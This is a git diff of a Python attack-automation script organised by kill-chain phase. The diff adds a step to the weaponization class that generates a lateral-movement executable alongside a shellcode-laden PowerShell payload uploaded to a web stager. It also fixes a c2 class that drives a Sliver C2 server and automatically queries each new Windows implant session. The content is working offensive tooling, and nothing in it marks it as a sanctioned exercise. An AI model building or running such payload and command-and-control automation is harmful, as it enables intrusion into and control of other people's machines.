@@ -115,6 +115,7 @@ class weaponization:
         print(self)
 
         self.temp_shellcode_path = "./data/payloads/win_stager.c"
+        self.payload_forlateral_movement = "./data/payloads/entitled_kilt"
         self.payload_template = "tools/sliver/payload_template.ps1"
         self.public_server_path = os.getenv("WEB_STAGER_PATH")
         self.public_payload_name = os.getenv("PAYLOAD_PS1")
@@ -126,6 +127,7 @@ class weaponization:
 
         data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
         data_in_payload_file = self.load_payload_template(self.payload_template)
+        data_payload_for_lateral_movement = self.create_payload_for_lateral_movement(self.payload_forlateral_movement)
 
         self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
         self.upload_to_website(self.payload_path)
@@ -188,6 +190,23 @@ class weaponization:
             print(f"An error occurred while loading the payload template: {e}")
             return ""
 
+    def create_payload_for_lateral_movement(self, file_path="./data/payloads/entitled_kilt"):
+        script_path = "./tools/sliver/create_payload_for_lateral_movement.sh"
+
+        # Check if file_path exists and delete if it does
+        full_file_name = file_path+".exe"
+        if os.path.exists(full_file_name):
+            os.remove(full_file_name)
+            print(f"Old payload at {file_path} has been deleted.")
+
+        # Call the function to run the shell script
+        try:
+            # Call the function to run the shell script
+            self.run_shell_script(script_path, file_path)
+            print("prepare payload successfully!")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
     def update_shellcode_in_payload(self, shellcode, payload):
         self.shellcode = shellcode
 
@@ -224,19 +243,19 @@ class weaponization:
 
         return zip_file_path
 
-    def zip_ps1_file(self, ps1_file_path):
-        # Extract directory and file name from the given path
-        directory, file_name = os.path.split(ps1_file_path)
+    # def zip_ps1_file(self, ps1_file_path):
+    #     # Extract directory and file name from the given path
+    #     directory, file_name = os.path.split(ps1_file_path)
 
-        # Create a zip file with the same name as the PS1 file
-        zip_file_path = os.path.join(directory, f"{file_name}.zip")
+    #     # Create a zip file with the same name as the PS1 file
+    #     zip_file_path = os.path.join(directory, f"{file_name}.zip")
 
-        # Create a ZipFile object to write to
-        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
-            # Add the PS1 file to the zip archive
-            zipf.write(ps1_file_path, arcname=file_name)
+    #     # Create a ZipFile object to write to
+    #     with zipfile.ZipFile(zip_file_path, 'w') as zipf:
+    #         # Add the PS1 file to the zip archive
+    #         zipf.write(ps1_file_path, arcname=file_name)
 
-        return zip_file_path    
+    #     return zip_file_path    
 
     def clear_phase(self):
         # check shell code
@@ -344,7 +363,7 @@ class c2:
         # Function to read and display output from the subprocess
         def read_output_by_line(self):
             while not self.stop_thread:
-                output = sliver_server.stdout.readline().strip()
+                output = self.sliver_server.stdout.readline().strip()
                 if output:
                     print(output)
                     if "- windows/amd64" in output:
@@ -354,7 +373,7 @@ class c2:
                         self.is_gather = True
                 time.sleep(0.1)
 
-        def intro(sliver_server):
+        def intro(self):
             # Flag to signal the thread to exit
             self.stop_thread = False
 
@@ -374,27 +393,36 @@ class c2:
 
             # Send commands to the sliver-server process
             for command in commands:
-                sliver_server.stdin.write(command)
-                sliver_server.stdin.flush()
+                self.sliver_server.stdin.write(command)
+                self.sliver_server.stdin.flush()
 
         def gather_thread_func(self):
             while True:
                 if self.is_gather:
-                    print("hello")
+                    commands = [
+                        f"use {self.ids[-1]}\n",
+                        "info\n",
+                        "background\n"
+                    ]
+                    # Send commands to the sliver-server process
+                    for command in commands:
+                        self.sliver_server.stdin.write(command)
+                        self.sliver_server.stdin.flush()
+
                     self.is_gather = False
                 # Add a short sleep to avoid busy waiting
                 time.sleep(0.1)
 
         try:
             # Start the sliver-server process
-            sliver_server = subprocess.Popen(['sliver-server'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            self.sliver_server = subprocess.Popen(['sliver-server'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
             # gather information from sessions id is comming
             gather_thread = threading.Thread(target=gather_thread_func, args=(self,))
             gather_thread.start()
 
             # handle
-            intro(sliver_server)
+            intro(self)
 
         except subprocess.CalledProcessError as e:
             print(f"Error executing sliver-server command: {e}")
@@ -422,11 +450,11 @@ class c2:
 def main():
     list_phase = []
     # list_phase.append(reconaissance())
-    # list_phase.append(weaponization())
+    list_phase.append(weaponization())
     # list_phase.append(delivery())
-    list_phase.append(exploitation())
-    list_phase.append(installation())
-    list_phase.append(c2())
+    # list_phase.append(exploitation())
+    # list_phase.append(installation())
+    # list_phase.append(c2())
 
 if __name__ == '__main__':
     main()
